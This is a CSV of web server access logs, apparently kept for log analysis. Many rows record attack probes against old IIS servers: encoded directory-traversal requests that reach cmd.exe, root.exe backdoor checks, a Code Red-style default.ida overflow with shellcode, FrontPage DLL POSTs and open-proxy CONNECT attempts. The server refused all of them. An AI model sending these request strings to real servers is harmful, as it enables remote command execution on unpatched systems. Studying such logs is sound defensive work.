"rhost";"date";"time";"timezone";"method";"request_first_line";"http_version";"final_state_code";"bytes";"referer";"user_agent";"compatibility";"MSIE";"MSIE_version";"OS";"OS_version"
"211.59.0.204";"Jan 30";"05:09:39";500;"GET";"/_mem_bin/..%255c../..%255c../..%255c../winnt/system32/cmd.exe?/c+dir";"HTTP/1.0";404;1041;"";"";"";"";"";"";""
"211.59.0.204";"Jan 30";"05:09:39";500;"GET";"/msadc/..%255c../..%255c../..%255c/..%c1%1c../..%c1%1c../..%c1%1c../winnt/system32/cmd.exe?/c+dir";"HTTP/1.0";404;1041;"";"";"";"";"";"";""
"211.59.0.204";"Jan 30";"05:09:40";500;"GET";"/scripts/..%c1%1c../winnt/system32/cmd.exe?/c+dir";"HTTP/1.0";404;1041;"";"";"";"";"";"";""
"211.59.0.204";"Jan 30";"05:09:40";500;"GET";"/scripts/..%c0%2f../winnt/system32/cmd.exe?/c+dir";"HTTP/1.0";404;1041;"";"";"";"";"";"";""
"211.59.0.204";"Jan 30";"05:09:41";500;"GET";"/scripts/..%c0%af../winnt/system32/cmd.exe?/c+dir";"HTTP/1.0";404;1041;"";"";"";"";"";"";""
"211.59.0.204";"Jan 30";"05:09:41";500;"GET";"/scripts/..%c1%9c../winnt/system32/cmd.exe?/c+dir";"HTTP/1.0";404;1041;"";"";"";"";"";"";""
"211.59.0.204";"Jan 30";"05:09:42";500;"GET";"/scripts/..%%35%63../winnt/system32/cmd.exe?/c+dir";"HTTP/1.0";400;974;"";"";"";"";"";"";""
"211.59.0.204";"Jan 30";"05:09:43";500;"GET";"/scripts/..%%35c../winnt/system32/cmd.exe?/c+dir";"HTTP/1.0";400;974;"";"";"";"";"";"";""
"211.59.0.204";"Jan 30";"05:09:43";500;"GET";"/scripts/..%25%35%63../winnt/system32/cmd.exe?/c+dir";"HTTP/1.0";404;1041;"";"";"";"";"";"";""
"211.59.0.204";"Jan 30";"05:09:44";500;"GET";"/scripts/..%252f../winnt/system32/cmd.exe?/c+dir";"HTTP/1.0";404;1041;"";"";"";"";"";"";""
"61.88.122.10";"Jan 30";"08:46:25";500;"GET";"/NULL.printer";"";404;1061;"";"";"";"";"";"";""
"24.199.102.163";"Jan 30";"11:22:24";500;"GET";"/";"HTTP/1.1";403;2898;"";"Mozilla/4.0";"compatible";"MSIE";"5.5";"Windows";"98"
"69.233.130.234";"Jan 30";"14:26:36";500;"GET";"/scripts/root.exe?/c+dir";"HTTP/1.0";404;1041;"";"";"";"";"";"";""
"69.233.130.234";"Jan 30";"14:26:37";500;"GET";"/MSADC/root.exe?/c+dir";"HTTP/1.0";404;1041;"";"";"";"";"";"";""
"69.233.130.234";"Jan 30";"14:26:40";500;"GET";"/c/winnt/system32/cmd.exe?/c+dir";"HTTP/1.0";404;1041;"";"";"";"";"";"";""
"69.233.130.234";"Jan 30";"14:26:41";500;"GET";"/d/winnt/system32/cmd.exe?/c+dir";"HTTP/1.0";404;1041;"";"";"";"";"";"";""
"69.233.130.234";"Jan 30";"14:26:41";500;"GET";"/scripts/..%255c../winnt/system32/cmd.exe?/c+dir";"HTTP/1.0";404;1041;"";"";"";"";"";"";""
"69.233.130.234";"Jan 30";"14:26:42";500;"GET";"/_vti_bin/..%255c../..%255c../..%255c../winnt/system32/cmd.exe?/c+dir";"HTTP/1.0";404;1041;"";"";"";"";"";"";""
"69.233.130.234";"Jan 30";"14:26:42";500;"GET";"/_mem_bin/..%255c../..%255c../..%255c../winnt/system32/cmd.exe?/c+dir";"HTTP/1.0";404;1041;"";"";"";"";"";"";""
"69.233.130.234";"Jan 30";"14:26:42";500;"GET";"/msadc/..%255c../..%255c../..%255c/..%c1%1c../..%c1%1c../..%c1%1c../winnt/system32/cmd.exe?/c+dir";"HTTP/1.0";404;1041;"";"";"";"";"";"";""
"69.233.130.234";"Jan 30";"14:26:43";500;"GET";"/scripts/..%c1%1c../winnt/system32/cmd.exe?/c+dir";"HTTP/1.0";404;1041;"";"";"";"";"";"";""
"69.233.130.234";"Jan 30";"14:26:43";500;"GET";"/scripts/..%c0%2f../winnt/system32/cmd.exe?/c+dir";"HTTP/1.0";404;1041;"";"";"";"";"";"";""
"69.233.130.234";"Jan 30";"14:26:44";500;"GET";"/scripts/..%c0%af../winnt/system32/cmd.exe?/c+dir";"HTTP/1.0";404;1041;"";"";"";"";"";"";""
"69.233.130.234";"Jan 30";"14:26:44";500;"GET";"/scripts/..%c1%9c../winnt/system32/cmd.exe?/c+dir";"HTTP/1.0";404;1041;"";"";"";"";"";"";""
"69.233.130.234";"Jan 30";"14:26:45";500;"GET";"/scripts/..%%35%63../winnt/system32/cmd.exe?/c+dir";"HTTP/1.0";400;974;"";"";"";"";"";"";""
"69.233.130.234";"Jan 30";"14:26:45";500;"GET";"/scripts/..%%35c../winnt/system32/cmd.exe?/c+dir";"HTTP/1.0";400;974;"";"";"";"";"";"";""
"69.233.130.234";"Jan 30";"14:26:46";500;"GET";"/scripts/..%25%35%63../winnt/system32/cmd.exe?/c+dir";"HTTP/1.0";404;1041;"";"";"";"";"";"";""
"69.233.130.234";"Jan 30";"14:26:46";500;"GET";"/scripts/..%252f../winnt/system32/cmd.exe?/c+dir";"HTTP/1.0";404;1041;"";"";"";"";"";"";""
"218.26.187.153";"Jan 30";"15:26:36";500;"GET";"/";"HTTP/1.1";403;2898;"";"Mozilla/4.0";"compatible";"MSIE";"5.5";"Windows";"98"
"202.253.200.65";"Jan 30";"15:52:35";500;"GET";"/";"HTTP/1.1";403;2898;"";"Mozilla/4.0";"compatible";"MSIE";"5.5";"Windows";"98"
"218.74.23.91";"Jan 30";"16:16:22";500;"GET";"/";"HTTP/1.1";403;2898;"";"Mozilla/4.0";"compatible";"MSIE";"5.5";"Windows";"98"
"61.190.72.114";"Jan 30";"19:03:12";500;"GET";"/";"HTTP/1.1";403;2898;"";"Mozilla/4.0";"compatible";"MSIE";"5.5";"Windows";"98"
"67.181.19.171";"Jan 30";"19:43:23";500;"GET";"/scripts/root.exe?/c+dir";"HTTP/1.0";404;1041;"";"";"";"";"";"";""
"67.181.19.171";"Jan 30";"19:43:23";500;"GET";"/MSADC/root.exe?/c+dir";"HTTP/1.0";404;1041;"";"";"";"";"";"";""
"67.181.19.171";"Jan 30";"19:43:23";500;"GET";"/c/winnt/system32/cmd.exe?/c+dir";"HTTP/1.0";404;1041;"";"";"";"";"";"";""
"67.181.19.171";"Jan 30";"19:43:24";500;"GET";"/d/winnt/system32/cmd.exe?/c+dir";"HTTP/1.0";404;1041;"";"";"";"";"";"";""
"67.181.19.171";"Jan 30";"19:43:24";500;"GET";"/scripts/..%255c../winnt/system32/cmd.exe?/c+dir";"HTTP/1.0";404;1041;"";"";"";"";"";"";""
"67.181.19.171";"Jan 30";"19:43:24";500;"GET";"/_vti_bin/..%255c../..%255c../..%255c../winnt/system32/cmd.exe?/c+dir";"HTTP/1.0";404;1041;"";"";"";"";"";"";""
"67.181.19.171";"Jan 30";"19:43:24";500;"GET";"/_mem_bin/..%255c../..%255c../..%255c../winnt/system32/cmd.exe?/c+dir";"HTTP/1.0";404;1041;"";"";"";"";"";"";""
"67.181.19.171";"Jan 30";"19:43:25";500;"GET";"/msadc/..%255c../..%255c../..%255c/..%c1%1c../..%c1%1c../..%c1%1c../winnt/system32/cmd.exe?/c+dir";"HTTP/1.0";404;1041;"";"";"";"";"";"";""
"67.181.19.171";"Jan 30";"19:43:25";500;"GET";"/scripts/..%c1%1c../winnt/system32/cmd.exe?/c+dir";"HTTP/1.0";404;1041;"";"";"";"";"";"";""
"67.181.19.171";"Jan 30";"19:43:25";500;"GET";"/scripts/..%c0%2f../winnt/system32/cmd.exe?/c+dir";"HTTP/1.0";404;1041;"";"";"";"";"";"";""
"67.181.19.171";"Jan 30";"19:43:25";500;"GET";"/scripts/..%c0%af../winnt/system32/cmd.exe?/c+dir";"HTTP/1.0";404;1041;"";"";"";"";"";"";""
"67.181.19.171";"Jan 30";"19:43:26";500;"GET";"/scripts/..%c1%9c../winnt/system32/cmd.exe?/c+dir";"HTTP/1.0";404;1041;"";"";"";"";"";"";""
"67.181.19.171";"Jan 30";"19:43:26";500;"GET";"/scripts/..%%35%63../winnt/system32/cmd.exe?/c+dir";"HTTP/1.0";400;974;"";"";"";"";"";"";""
"67.181.19.171";"Jan 30";"19:43:26";500;"GET";"/scripts/..%%35c../winnt/system32/cmd.exe?/c+dir";"HTTP/1.0";400;974;"";"";"";"";"";"";""
"67.181.19.171";"Jan 30";"19:43:26";500;"GET";"/scripts/..%25%35%63../winnt/system32/cmd.exe?/c+dir";"HTTP/1.0";404;1041;"";"";"";"";"";"";""
"67.181.19.171";"Jan 30";"19:43:27";500;"GET";"/scripts/..%252f../winnt/system32/cmd.exe?/c+dir";"HTTP/1.0";404;1041;"";"";"";"";"";"";""
"211.22.73.68";"Jan 30";"20:27:32";500;"GET";"/sumthin";"HTTP/1.0";404;1061;"";"";"";"";"";"";""
"211.22.73.68";"Jan 30";"20:27:32";500;"GET";"/sumthin";"HTTP/1.0";404;1061;"";"";"";"";"";"";""
"211.22.73.68";"Jan 30";"20:27:36";500;"GET";"/sumthin";"HTTP/1.0";404;1061;"";"";"";"";"";"";""
"211.22.73.68";"Jan 30";"20:27:36";500;"GET";"/sumthin";"HTTP/1.0";404;1061;"";"";"";"";"";"";""
"211.22.73.68";"Jan 30";"20:27:36";500;"GET";"/sumthin";"HTTP/1.0";404;1061;"";"";"";"";"";"";""
"211.22.73.68";"Jan 30";"20:27:40";500;"GET";"/sumthin";"HTTP/1.0";404;1061;"";"";"";"";"";"";""
"211.22.102.234";"Jan 30";"21:18:40";500;"GET";"/";"HTTP/1.1";403;2898;"";"Mozilla/4.0";"compatible";"MSIE";"5.5";"Windows";"98"
"65.202.15.194";"Jan 30";"21:31:38";500;"GET";"/default.ida?XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX%u9090%u6858%ucbd3%u7801%u9090%u6858%ucbd3%u7801%u9090%u6858%ucbd3%u7801%u9090%u9090%u8190%u00c3%u0003%u8b00%u531b%u53ff%u0078%u0000%u00=a";"HTTP/1.0";404;1061;"";"";"";"";"";"";""
"61.10.7.127";"Jan 30";"22:39:15";500;"GET";"/";"HTTP/1.1";403;2898;"";"Mozilla/4.0";"compatible";"MSIE";"5.5";"Windows";"98"
"218.28.40.100";"Jan 30";"23:11:18";500;"GET";"/scripts/root.exe?/c+dir";"HTTP/1.0";404;1041;"";"";"";"";"";"";""
"218.28.40.100";"Jan 30";"23:11:20";500;"GET";"/MSADC/root.exe?/c+dir";"HTTP/1.0";404;1041;"";"";"";"";"";"";""
"218.28.40.100";"Jan 30";"23:11:23";500;"GET";"/c/winnt/system32/cmd.exe?/c+dir";"HTTP/1.0";404;1041;"";"";"";"";"";"";""
"218.28.40.100";"Jan 30";"23:11:25";500;"GET";"/d/winnt/system32/cmd.exe?/c+dir";"HTTP/1.0";404;1041;"";"";"";"";"";"";""
"218.28.40.100";"Jan 30";"23:11:28";500;"GET";"/scripts/..%255c../winnt/system32/cmd.exe?/c+dir";"HTTP/1.0";404;1041;"";"";"";"";"";"";""
"218.28.40.100";"Jan 30";"23:11:30";500;"GET";"/_vti_bin/..%255c../..%255c../..%255c../winnt/system32/cmd.exe?/c+dir";"HTTP/1.0";404;1041;"";"";"";"";"";"";""
"218.28.40.100";"Jan 30";"23:11:36";500;"GET";"/_mem_bin/..%255c../..%255c../..%255c../winnt/system32/cmd.exe?/c+dir";"HTTP/1.0";404;1041;"";"";"";"";"";"";""
"218.28.40.100";"Jan 30";"23:11:41";500;"GET";"/msadc/..%255c../..%255c../..%255c/..%c1%1c../..%c1%1c../..%c1%1c../winnt/system32/cmd.exe?/c+dir";"HTTP/1.0";404;1041;"";"";"";"";"";"";""
"61.183.208.219";"Jan 31";"00:32:36";500;"GET";"/";"HTTP/1.1";403;2898;"";"Mozilla/4.0";"compatible";"MSIE";"5.5";"Windows";"98"
"210.22.146.234";"Jan 31";"01:33:44";500;"GET";"/";"HTTP/1.1";403;2898;"";"Mozilla/4.0";"compatible";"MSIE";"5.5";"Windows";"98"
"68.214.68.216";"Jan 31";"03:01:45";500;"GET";"/";"HTTP/1.1";403;2898;"";"";"";"";"";"";""
"68.214.68.216";"Jan 31";"03:42:24";500;"GET";"/";"HTTP/1.1";403;2898;"";"";"";"";"";"";""
"65.122.119.10";"Jan 31";"05:07:07";500;"GET";"/";"HTTP/1.1";403;2898;"";"Mozilla/4.0";"compatible";"MSIE";"5.5";"Windows";"98"
"222.166.160.129";"Jan 31";"08:52:22";500;"GET";"/";"HTTP/1.1";403;2898;"";"Mozilla/4.0";"compatible";"MSIE";"5.5";"Windows";"98"
"66.255.109.222";"Jan 31";"14:13:01";500;"GET";"/";"HTTP/1.1";403;2898;"";"Mozilla/4.0";"compatible";"MSIE";"5.5";"Windows";"98"
"199.63.0.1";"Jan 31";"14:41:04";500;"GET";"/";"HTTP/1.1";403;2898;"";"Mozilla/4.0";"compatible";"MSIE";"5.5";"Windows";"98"
"24.94.203.115";"Jan 31";"16:47:52";500;"GET";"/";"HTTP/1.1";403;2898;"";"Mozilla/4.0";"compatible";"MSIE";"5.5";"Windows";"98"
"221.79.146.7";"Jan 31";"17:32:49";500;"GET";"/";"HTTP/1.1";403;2898;"";"Mozilla/4.0";"compatible";"MSIE";"5.5";"Windows";"98"
"70.48.9.26";"Jan 31";"18:28:20";500;"GET";"/";"HTTP/1.1";403;2898;"";"Mozilla/4.0";"compatible";"MSIE";"5.5";"Windows";"98"
"222.166.160.87";"Jan 31";"18:32:47";500;"GET";"/";"HTTP/1.1";403;2898;"";"Mozilla/4.0";"compatible";"MSIE";"5.5";"Windows";"98"
"70.183.86.76";"Jan 31";"18:33:53";500;"GET";"/";"HTTP/1.1";403;2898;"";"Mozilla/4.0";"compatible";"MSIE";"5.5";"Windows";"98"
"62.177.153.106";"Jan 31";"23:53:59";500;"GET";"/";"HTTP/1.1";403;2898;"";"Mozilla/4.0";"compatible";"MSIE";"5.5";"Windows";"98"
"218.22.120.198";"Feb 01";"03:37:16";500;"GET";"/";"HTTP/1.1";403;2898;"";"Mozilla/4.0";"compatible";"MSIE";"5.5";"Windows";"98"
"65.117.45.251";"Feb 01";"04:07:05";500;"POST";"/_vti_bin/_vti_aut/fp30reg.dll";"HTTP/1.1";404;407;"";"";"";"";"";"";""
"65.117.45.251";"Feb 01";"04:07:05";500;"POST";"/_vti_bin/_vti_aut/fp30reg.dll";"HTTP/1.1";404;407;"";"";"";"";"";"";""
"65.117.45.251";"Feb 01";"04:07:07";500;"POST";"/_vti_bin/_vti_aut/fp30reg.dll";"HTTP/1.1";404;407;"";"";"";"";"";"";""
"65.117.45.251";"Feb 01";"04:07:07";500;"POST";"/_vti_bin/_vti_aut/fp30reg.dll";"HTTP/1.1";404;407;"";"";"";"";"";"";""
"65.117.45.251";"Feb 01";"04:07:07";500;"POST";"/_vti_bin/_vti_aut/fp30reg.dll";"HTTP/1.1";404;407;"";"";"";"";"";"";""
"65.117.45.251";"Feb 01";"04:07:07";500;"POST";"/_vti_bin/_vti_aut/fp30reg.dll";"HTTP/1.1";404;407;"";"";"";"";"";"";""
"65.117.45.251";"Feb 01";"04:07:07";500;"POST";"/_vti_bin/_vti_aut/fp30reg.dll";"HTTP/1.1";404;407;"";"";"";"";"";"";""
"65.117.45.251";"Feb 01";"04:07:07";500;"POST";"/_vti_bin/_vti_aut/fp30reg.dll";"HTTP/1.1";404;407;"";"";"";"";"";"";""
"65.117.45.251";"Feb 01";"04:07:07";500;"POST";"/_vti_bin/_vti_aut/fp30reg.dll";"HTTP/1.1";404;407;"";"";"";"";"";"";""
"65.117.45.251";"Feb 01";"04:07:06";500;"POST";"/_vti_bin/_vti_aut/fp30reg.dll";"HTTP/1.1";404;407;"";"";"";"";"";"";""
"65.117.45.251";"Feb 01";"04:07:07";500;"POST";"/_vti_bin/_vti_aut/fp30reg.dll";"HTTP/1.1";404;407;"";"";"";"";"";"";""
"65.117.45.251";"Feb 01";"04:07:05";500;"POST";"/_vti_bin/_vti_aut/fp30reg.dll";"HTTP/1.1";404;407;"";"";"";"";"";"";""
"65.117.45.251";"Feb 01";"04:07:05";500;"POST";"/_vti_bin/_vti_aut/fp30reg.dll";"HTTP/1.1";404;407;"";"";"";"";"";"";""
"65.117.45.251";"Feb 01";"04:07:05";500;"POST";"/_vti_bin/_vti_aut/fp30reg.dll";"HTTP/1.1";404;407;"";"";"";"";"";"";""
"65.117.45.251";"Feb 01";"04:07:05";500;"POST";"/_vti_bin/_vti_aut/fp30reg.dll";"HTTP/1.1";404;407;"";"";"";"";"";"";""
"65.117.45.251";"Feb 01";"04:07:05";500;"POST";"/_vti_bin/_vti_aut/fp30reg.dll";"HTTP/1.1";404;407;"";"";"";"";"";"";""
"65.117.45.251";"Feb 01";"04:07:05";500;"POST";"/_vti_bin/_vti_aut/fp30reg.dll";"HTTP/1.1";404;407;"";"";"";"";"";"";""
"65.117.45.251";"Feb 01";"04:07:09";500;"POST";"/_vti_bin/_vti_aut/fp30reg.dll";"HTTP/1.1";404;407;"";"";"";"";"";"";""
"65.117.45.251";"Feb 01";"04:07:09";500;"POST";"/_vti_bin/_vti_aut/fp30reg.dll";"HTTP/1.1";404;407;"";"";"";"";"";"";""
"65.117.45.251";"Feb 01";"04:07:09";500;"POST";"/_vti_bin/_vti_aut/fp30reg.dll";"HTTP/1.1";404;407;"";"";"";"";"";"";""
"65.117.45.251";"Feb 01";"04:07:09";500;"POST";"/_vti_bin/_vti_aut/fp30reg.dll";"HTTP/1.1";404;407;"";"";"";"";"";"";""
"65.117.45.251";"Feb 01";"04:07:09";500;"POST";"/_vti_bin/_vti_aut/fp30reg.dll";"HTTP/1.1";404;407;"";"";"";"";"";"";""
"65.117.45.251";"Feb 01";"04:07:09";500;"POST";"/_vti_bin/_vti_aut/fp30reg.dll";"HTTP/1.1";404;407;"";"";"";"";"";"";""
"222.83.129.198";"Feb 01";"04:27:50";500;"GET";"/";"HTTP/1.1";403;2898;"";"Mozilla/4.0";"compatible";"MSIE";"5.5";"Windows";"98"
"216.70.251.2";"Feb 01";"06:42:32";500;"GET";"/";"HTTP/1.1";403;2898;"";"Mozilla/4.0";"compatible";"MSIE";"5.5";"Windows";"98"
"68.223.144.102";"Feb 01";"07:20:54";500;"GET";"/";"HTTP/1.1";403;2898;"";"Mozilla/4.0";"compatible";"MSIE";"5.5";"Windows";"98"
"221.184.100.13";"Feb 01";"08:46:10";500;"GET";"/scripts/root.exe?/c+dir";"HTTP/1.0";404;1041;"";"";"";"";"";"";""
"221.184.100.13";"Feb 01";"08:46:10";500;"GET";"/MSADC/root.exe?/c+dir";"HTTP/1.0";404;1041;"";"";"";"";"";"";""
"221.184.100.13";"Feb 01";"08:46:11";500;"GET";"/c/winnt/system32/cmd.exe?/c+dir";"HTTP/1.0";404;1041;"";"";"";"";"";"";""
"221.184.100.13";"Feb 01";"08:46:11";500;"GET";"/d/winnt/system32/cmd.exe?/c+dir";"HTTP/1.0";404;1041;"";"";"";"";"";"";""
"221.184.100.13";"Feb 01";"08:46:12";500;"GET";"/scripts/..%255c../winnt/system32/cmd.exe?/c+dir";"HTTP/1.0";404;1041;"";"";"";"";"";"";""
"221.184.100.13";"Feb 01";"08:46:16";500;"GET";"/_vti_bin/..%255c../..%255c../..%255c../winnt/system32/cmd.exe?/c+dir";"HTTP/1.0";404;1041;"";"";"";"";"";"";""
"221.184.100.13";"Feb 01";"08:46:16";500;"GET";"/_mem_bin/..%255c../..%255c../..%255c../winnt/system32/cmd.exe?/c+dir";"HTTP/1.0";404;1041;"";"";"";"";"";"";""
"221.184.100.13";"Feb 01";"08:46:17";500;"GET";"/msadc/..%255c../..%255c../..%255c/..%c1%1c../..%c1%1c../..%c1%1c../winnt/system32/cmd.exe?/c+dir";"HTTP/1.0";404;1041;"";"";"";"";"";"";""
"221.184.100.13";"Feb 01";"08:46:17";500;"GET";"/scripts/..%c1%1c../winnt/system32/cmd.exe?/c+dir";"HTTP/1.0";404;1041;"";"";"";"";"";"";""
"221.184.100.13";"Feb 01";"08:46:18";500;"GET";"/scripts/..%c0%2f../winnt/system32/cmd.exe?/c+dir";"HTTP/1.0";404;1041;"";"";"";"";"";"";""
"221.184.100.13";"Feb 01";"08:46:18";500;"GET";"/scripts/..%c0%af../winnt/system32/cmd.exe?/c+dir";"HTTP/1.0";404;1041;"";"";"";"";"";"";""
"221.184.100.13";"Feb 01";"08:46:19";500;"GET";"/scripts/..%c1%9c../winnt/system32/cmd.exe?/c+dir";"HTTP/1.0";404;1041;"";"";"";"";"";"";""
"221.184.100.13";"Feb 01";"08:46:19";500;"GET";"/scripts/..%%35%63../winnt/system32/cmd.exe?/c+dir";"HTTP/1.0";400;974;"";"";"";"";"";"";""
"221.184.100.13";"Feb 01";"08:46:20";500;"GET";"/scripts/..%%35c../winnt/system32/cmd.exe?/c+dir";"HTTP/1.0";400;974;"";"";"";"";"";"";""
"221.184.100.13";"Feb 01";"08:46:21";500;"GET";"/scripts/..%25%35%63../winnt/system32/cmd.exe?/c+dir";"HTTP/1.0";404;1041;"";"";"";"";"";"";""
"221.184.100.13";"Feb 01";"08:46:21";500;"GET";"/scripts/..%252f../winnt/system32/cmd.exe?/c+dir";"HTTP/1.0";404;1041;"";"";"";"";"";"";""
"64.192.107.195";"Feb 01";"08:47:30";500;"GET";"/";"HTTP/1.1";403;2898;"";"Mozilla/4.0";"compatible";"MSIE";"5.5";"Windows";"98"
"81.6.250.202";"Feb 01";"09:05:33";500;"GET";"/NULL.printer";"";404;1061;"";"";"";"";"";"";""
"193.95.148.135";"Feb 01";"12:14:12";500;"GET";"/";"HTTP/1.1";403;2898;"";"Mozilla/4.0";"compatible";"MSIE";"5.5";"Windows";"98"
"218.242.255.106";"Feb 01";"12:40:18";500;"GET";"/";"HTTP/1.1";403;2898;"";"Mozilla/4.0";"compatible";"MSIE";"5.5";"Windows";"98"
"69.86.160.253";"Feb 01";"12:58:31";500;"GET";"/";"HTTP/1.0";403;2898;"";"";"";"";"";"";""
"69.86.160.253";"Feb 01";"12:58:31";500;"GET";"/";"HTTP/1.0";403;2898;"";"";"";"";"";"";""
"69.86.160.253";"Feb 01";"12:58:31";500;"GET";"/";"HTTP/1.0";403;2898;"";"";"";"";"";"";""
"69.86.160.253";"Feb 01";"12:58:31";500;"GET";"/";"HTTP/1.0";403;2898;"";"";"";"";"";"";""
"69.86.160.253";"Feb 01";"12:58:31";500;"GET";"/";"HTTP/1.0";403;2898;"";"";"";"";"";"";""
"69.86.160.253";"Feb 01";"12:58:31";500;"GET";"/";"HTTP/1.0";403;2898;"";"";"";"";"";"";""
"69.86.160.253";"Feb 01";"12:58:31";500;"GET";"/";"HTTP/1.0";403;2898;"";"";"";"";"";"";""
"69.86.160.253";"Feb 01";"12:58:31";500;"GET";"/";"HTTP/1.0";403;2898;"";"";"";"";"";"";""
"69.86.160.253";"Feb 01";"12:58:31";500;"GET";"/";"HTTP/1.0";403;2898;"";"";"";"";"";"";""
"69.86.160.253";"Feb 01";"12:58:31";500;"GET";"/";"HTTP/1.0";403;2898;"";"";"";"";"";"";""
"69.86.160.253";"Feb 01";"12:58:31";500;"GET";"/";"HTTP/1.0";403;2898;"";"";"";"";"";"";""
"69.86.160.253";"Feb 01";"12:58:31";500;"GET";"/";"HTTP/1.0";403;2898;"";"";"";"";"";"";""
"69.86.160.253";"Feb 01";"12:58:31";500;"GET";"/";"HTTP/1.0";403;2898;"";"";"";"";"";"";""
"69.86.160.253";"Feb 01";"12:58:31";500;"GET";"/";"HTTP/1.0";403;2898;"";"";"";"";"";"";""
"69.86.160.253";"Feb 01";"12:58:31";500;"GET";"/";"HTTP/1.0";403;2898;"";"";"";"";"";"";""
"69.86.160.253";"Feb 01";"12:58:31";500;"GET";"/";"HTTP/1.0";403;2898;"";"";"";"";"";"";""
"69.86.160.253";"Feb 01";"12:58:31";500;"GET";"/";"HTTP/1.0";403;2898;"";"";"";"";"";"";""
"69.86.160.253";"Feb 01";"12:58:31";500;"GET";"/";"HTTP/1.0";403;2898;"";"";"";"";"";"";""
"69.86.160.253";"Feb 01";"12:58:31";500;"GET";"/";"HTTP/1.0";403;2898;"";"";"";"";"";"";""
"69.86.160.253";"Feb 01";"12:58:31";500;"GET";"/";"HTTP/1.0";403;2898;"";"";"";"";"";"";""
"69.86.160.253";"Feb 01";"12:58:31";500;"GET";"/";"HTTP/1.0";403;2898;"";"";"";"";"";"";""
"69.86.160.253";"Feb 01";"12:58:31";500;"GET";"/";"HTTP/1.0";403;2898;"";"";"";"";"";"";""
"69.86.160.253";"Feb 01";"12:58:31";500;"GET";"/";"HTTP/1.0";403;2898;"";"";"";"";"";"";""
"63.245.85.123";"Feb 01";"15:01:32";500;"GET";"/default.ida?XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX%u9090%u6858%ucbd3%u7801%u9090%u6858%ucbd3%u7801%u9090%u6858%ucbd3%u7801%u9090%u9090%u8190%u00c3%u0003%u8b00%u531b%u53ff%u0078%u0000%u00=a";"HTTP/1.0";404;1061;"";"";"";"";"";"";""
"64.85.244.116";"Feb 01";"16:05:07";500;"GET";"/";"HTTP/1.1";403;2898;"";"Mozilla/4.0";"compatible";"MSIE";"5.5";"Windows";"98"
"82.229.169.73";"Feb 01";"18:48:22";500;"CONNECT";"1.3.3.7:1337";"HTTP/1.0";405;975;"";"";"";"";"";"";""
"82.229.169.73";"Feb 01";"18:48:22";500;"CONNECT";"1.3.3.7:1337";"HTTP/1.0";405;975;"";"";"";"";"";"";""
"82.229.169.73";"Feb 01";"18:48:22";500;"CONNECT";"1.3.3.7:1337";"HTTP/1.0";405;975;"";"";"";"";"";"";""
"82.229.169.73";"Feb 01";"18:48:22";500;"CONNECT";"1.3.3.7:1337";"HTTP/1.0";405;975;"";"";"";"";"";"";""
"82.229.169.73";"Feb 01";"18:48:22";500;"CONNECT";"1.3.3.7:1337";"HTTP/1.0";405;975;"";"";"";"";"";"";""
"82.229.169.73";"Feb 01";"18:48:22";500;"CONNECT";"1.3.3.7:1337";"HTTP/1.0";405;975;"";"";"";"";"";"";""
"82.229.169.73";"Feb 01";"18:48:22";500;"CONNECT";"1.3.3.7:1337";"HTTP/1.0";405;975;"";"";"";"";"";"";""
"82.229.169.73";"Feb 01";"18:48:22";500;"CONNECT";"1.3.3.7:1337";"HTTP/1.0";405;975;"";"";"";"";"";"";""
"82.229.169.73";"Feb 01";"18:48:22";500;"CONNECT";"1.3.3.7:1337";"HTTP/1.0";405;975;"";"";"";"";"";"";""
"82.229.169.73";"Feb 01";"18:48:22";500;"CONNECT";"1.3.3.7:1337";"HTTP/1.0";405;975;"";"";"";"";"";"";""
"82.229.169.73";"Feb 01";"18:48:22";500;"CONNECT";"1.3.3.7:1337";"HTTP/1.0";405;975;"";"";"";"";"";"";""
